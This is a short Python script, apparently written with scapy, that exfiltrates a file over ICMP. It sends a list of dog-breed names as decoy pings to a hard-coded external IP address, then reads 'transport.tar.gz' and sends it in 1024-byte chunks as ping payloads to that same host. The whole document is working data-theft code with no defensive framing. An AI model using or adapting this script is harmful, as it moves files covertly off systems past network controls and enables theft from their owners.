#!/usr/bin/python
from scapy.all import *

conf.verb = 0
omfgdogs = "107.170.46.184"

def ping(part):
    TIMEOUT = 2
    packet = IP(dst=omfgdogs, ttl=20)/ICMP()/Raw(load=part)
    sr1(packet, timeout=TIMEOUT)

def split_file(filename, split_size):
    with open(filename, "rb") as f:
        data = f.read()
        parts = [data[i:i+split_size] for i in range(0, len(data), split_size)]
        for part in parts:
            print "asdf"
            ping(part)

dogs = ["Terrier", "Springer Spaniel", "Sheep Dog", "Blood Hound", "Boxer", "Collie", "Doge", "Retriever", "Dalmatians", "German Shepherd", "Great Dane", "Husky", "Poodle", "Corgie", "Saint Bernard", "Beagle", "Foxhound", "Greyhound"]

for dog in dogs:
    ping(dog)

split_file("transport.tar.gz", 1024)

